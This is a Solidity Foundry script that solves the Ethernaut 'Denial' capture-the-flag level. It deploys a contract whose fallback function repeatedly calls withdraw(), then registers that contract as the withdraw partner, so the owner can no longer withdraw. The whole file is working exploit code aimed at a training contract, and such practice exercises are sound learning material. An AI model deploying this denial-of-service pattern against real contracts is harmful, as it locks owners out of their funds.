// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import { Script } from "forge-std/Script.sol";
import { EthernautScript } from "src/common/EthernautScript.sol";
import { Denial } from "./Problem.sol";

contract Solution {
    Denial denial;

    uint256 public counter;

    constructor(Denial _denial) public {
        denial = _denial;
    }

    fallback() external payable {
        denial.withdraw();
    }
}

contract SolutionScript is EthernautScript {

    function solve(address payable _instanceAddress) internal override {
        Denial denial = Denial(_instanceAddress);

        vm.startBroadcast();
        Solution solution = new Solution(denial);
        denial.setWithdrawPartner(address(solution));
        vm.stopBroadcast();

        // Test that owner cannot withdraw anymore
        // TODO: This test cannot be done here since vm.expectRevert does not work in forge script.
        // vm.startPrank(denial.owner());
        // vm.expectRevert();
        // denial.withdraw();
        // vm.stopPrank();
    }

    function getLevelAddress() internal view override returns(address) {
        return 0xf1D573178225513eDAA795bE9206f7E311EeDEc3;
    }

    function getCreationValue() internal view override returns(uint256) {
        return 0.001 ether;
    }

}

